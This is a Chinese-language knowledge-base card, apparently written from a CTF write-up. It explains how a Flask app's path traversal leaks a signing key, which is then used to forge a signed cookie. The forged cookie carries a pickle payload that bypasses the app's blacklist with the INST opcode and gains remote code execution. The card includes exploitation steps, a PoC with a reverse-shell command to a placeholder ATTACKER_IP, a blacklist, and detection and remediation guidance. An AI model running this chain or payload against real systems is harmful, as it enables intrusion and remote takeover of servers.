---
id: web-python-deserialization-flask-path-traversal-signed-cookie-pickle-rce
title: Flask 路径穿越泄露签名密钥：伪造 HMAC 签名 Cookie 触发 pickle 反序列化 RCE（INST opcode 绕黑名单）
type: scenario
domain: web
path: web/python/deserialization
technique: flask-traversal-signed-cookie-pickle-inst-opcode-rce
tags:
- python
- flask
- path-traversal
- pickle
- deserialization
- signed-cookie
- hmac
- blacklist-bypass
- opcode
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-08T00:49:30+08:00'
  notes: 已对照原文与33张图：/lyrics 路径穿越读 /proc/self/environ、app.py、config/secret_key.py(EnjoyThePlayTime123456) 与 cookie.py；cookie 为 !HMAC-MD5?base64(pickle) 且验签后 pickle.loads；board 里对整段 cookie 的 pickle.loads 不可用；waf 黑名单含 b"R"，原文用 INST(i) 的 (S...ios system.) 绕过并反弹 shell 拿 DASCTF flag，均与图09-14一致。已修正卡内 PoC 的 print 括号语法错误（knowledge 与 staging 同步）。未本机复跑；affected_versions 无原文版本区间。dup-scan 无本卡 pair；dedup top related 为 Bottle 签名 cookie 同 sink 不同实现。
url: /docs/web/python/deserialization/web-python-deserialization-flask-path-traversal-signed-cookie-pickle-rce/
draft: false
kb_aliases:
- lyrics 路径穿越
- 签名 Cookie pickle
- 自实现 cookie.py
- INST opcode 绕黑名单
- pickle 黑名单绕过 R
- HMAC-MD5 签名 Cookie 伪造
---

## 一句话结论

应用把用户参数直接拼进文件路径造成任意文件读取，攻击者可读源码拿到签名密钥；该应用自实现的签名 Cookie 在验签后对 Cookie 负载执行 `pickle.loads`，攻击者用泄露密钥重签一个含 `INST`（`i`）opcode 的 pickle 负载即可 RCE，并用 `INST` 代替被黑名单拦截的 `REDUCE`（`R`）opcode。

## 原理

- **路径穿越读文件**：`/lyrics` 处理函数执行 `path = os.path.join(os.getcwd() + "/lyrics", request.args.get("lyrics"))` 后直接 `open(path)`。`os.path.join` 只负责拼接分隔符，不做规范化，也不校验结果仍位于 `lyrics/` 下；`lyrics=../../../../etc/passwd` 会逐级上跳。由此可读 `/proc/self/environ`、`../app.py`、`../config/secret_key.py`、`../cookie.py`，暴露密钥和 Cookie 实现。
- **签名 Cookie 的本质**：`cookie.py`（注释自称取自 Bottle 模板）用 `!` + `base64(HMAC-MD5(key, msg))` + `?` + `msg` 组成 Cookie，其中 `msg = base64(pickle.dumps((name, value)))`。`cookie_check()` 用 `_lscmp` 比对 HMAC 后，把 `msg` base64 解码交给黑名单 `waf()`；`get_cookie()` 验签通过后调用 `cookie_decode()`，最终执行 `pickle.loads(base64.b64decode(msg))`。
- **密钥即信任边界**：签名只防篡改，算法与格式公开，唯一秘密是 `secret_code`。源码/配置被路径穿越读出后，攻击者拥有和服务端相同的签名能力，可自造任意 `msg` 并通过验签。
- **为什么 app.py 里的 `pickle.loads(data)` 不可用**：`board()` 里 `data` 是整段 Cookie（以 `!` 开头、含 `?` 与签名），不是合法 pickle 流；真正可利用的 sink 在 `cookie.py` 的 `cookie_decode()`。必须先通过 `cookie_check()`，它才继续走到 `get_cookie()`。
- **黑名单及其绕过**：`waf()` 黑名单为 `[b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']`，其中 `R` 针对 pickle 常用 `REDUCE` opcode。改用协议 0 的 `i`（`INST`）opcode：流为 `MARK + STRING(cmd) + INST(模块名 os, 类名 system) + STOP`，反序列化时按 `os.system(cmd)` 调用。`i`、`os`、`system` 均不含黑名单字节，命令串也避开关键字，于是验签后直接命令执行。
- 注意 `cookie_check()` 的语义是“命中黑名单才返回 True 拒绝”，因此恶意负载必须**不命中**任何黑名单词，才能继续进入 `get_cookie()` 的 `pickle.loads`。

## 触发条件

- Python Web 应用存在用户可控的任意文件读取（路径拼接 / 穿越），能读到源码、配置或密钥；或 `secret` 以其他方式泄露（仓库历史、镜像层、调试页、错误栈）。
- 应用使用“签名 Cookie + pickle”组合：验签通过后对 Cookie 内容做 `pickle.loads`，且未使用 `RestrictedUnpickler`/类白名单。
- 签名算法与 Cookie 格式可复现（本场景为 HMAC-MD5 + `!sig?msg`），故密钥泄露即可伪造。
- 反序列化前的过滤只是字面量关键字黑名单，可用等价 opcode / 未列入黑名单的模块函数绕过。
- 攻击者能把自定义 Cookie 发给会调用 `get_cookie(..., secret=...)` 的路由。

## 利用步骤

1. 枚举路由并测试路径穿越：`/lyrics?lyrics=../../../../etc/passwd`，再读 `/proc/self/environ`、应用源码、配置文件。
2. 从源码定位签名密钥（如 `config/secret_key.py` 中的 `secret_code`）和 Cookie 实现（`cookie.py`），确认验签算法、Cookie 前缀/分隔符与 pickle 入口。
3. 手工构造协议 0 pickle：`(` 压入 MARK，`S'...'` 压入命令字符串，`i` + `os\n` + `system\n` 以该字符串为参数实例化并调用 `os.system`，`.` 结束；确保结果字节不含黑名单词。
4. 对 base64 后的 `msg` 计算 HMAC-MD5，拼成 `!<sig>?<msg>`。
5. 携带 `Cookie: user=!<sig>?<msg>` 访问调用 `get_cookie` 的页面（本场景为 `/board`），触发 `pickle.loads`；命令执行后通过反弹 shell 或回显确认。

## PoC

```python
import base64, hashlib, hmac

key = b"<从源码/配置泄露的 secret_code>"
# 协议 0 手写：MARK + STRING(命令) + INST(os.system) + STOP
# STRING 行内最外层单引号由解析器剥离，内部单引号按原样保留
payload = b"(S'bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1''\nios\nsystem\n."
msg = base64.b64encode(payload)
sig = base64.b64encode(hmac.new(key, msg, hashlib.md5).digest())
print((b"!" + sig + b"?" + msg).decode())
```

```http
GET /board HTTP/1.1
Host: target
Cookie: user=!<base64(HMAC-MD5(key, msg))>?<base64(pickle)>
```

```text
服务端 cookie_check -> HMAC 通过 -> waf(msg) 未命中 -> get_cookie
  -> cookie_decode -> pickle.loads(base64.b64decode(msg))
  -> INST(os, system) 以命令串为参数 -> os.system(...) 执行
```

说明：若用常规 `__reduce__` 构造，pickle 会写入 `R`（REDUCE）而被 `b'R'` 拦截；`INST` 版本不含该字节。命令串需自行检查不得出现 `secret/eval/file/compile/open/os.popen`。

## 变体与关联

- 密钥来源变体：路径穿越读源码/配置、`.git` 泄露、环境变量、Docker 镜像层、报错页与调试端点；密钥弱可离线爆破时也可直接伪造。
- Cookie 格式变体：Bottle 原生签名 Cookie、Flask `itsdangerous` 会话、Django 签名 Cookie 只要最终对 Pickle 反序列化都同理；格式不同只影响签名复现。
- opcode 变体：除 `INST` 外，可用 `OBJ`、`BUILD`、`STACK_GLOBAL` 等组合规避针对 `R`/`c`/`(` 的字节黑名单；黑名单若做小写归一化，命令与模块名需同时避开大小写变体。
- 关联卡片：[[web-python-deserialization-bottle-signed-cookie-pickle-rce]]（Bottle 原生 `get_cookie(secret=)` 同一 sink，本卡为 Flask + 自实现 cookie.py 且增加路径穿越取密钥与 opcode 绕过）、[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]（关键字黑名单用未列名 sink 绕过）、[[web-python-deserialization-pickle-codetype-function-hijack]]（pickle 构造技巧）。
- 边界：若服务端先验签且密钥未泄露、或使用 `RestrictedUnpickler.find_class` 白名单、或用 JSON 替代 pickle，本链不成立；WAF 若检查 opcode 而非关键字，`INST` 变体也可能被拦截。

## 检测与防御

- 检测：请求参数出现 `../`、`%2e%2e%2f` 且响应包含源码/环境变量；Cookie 值呈 `!<base64>?<base64>` 结构，base64 解码后出现 pickle 魔数 `\x80\x04`/`\x80\x05` 或协议 0 的 `(S'`、`ios`、`system`、`INST` 等特征；签名校验失败/异常的 Cookie 频率；Web 进程拉起 `bash`/`sh` 等异常子进程。
- 修复：文件路径用 `os.path.realpath` 规范化后校验仍在允许目录内，或改用白名单文件名映射；不要把源码/配置放在 Web 可达路径。
- 修复：Cookie 使用 JSON 等安全序列化格式；如必须反序列化对象，使用 `pickle.Unpickler.find_class` 白名单或 `RestrictedUnpickler`；密钥放入密钥管理服务并支持轮换，泄露后立即轮换。
- 加固：不使用关键字黑名单作为安全边界（等价 opcode 可绕过）；对 Cookie 做结构校验与长度限制；监控异常反序列化错误与 Cookie 伪造尝试。
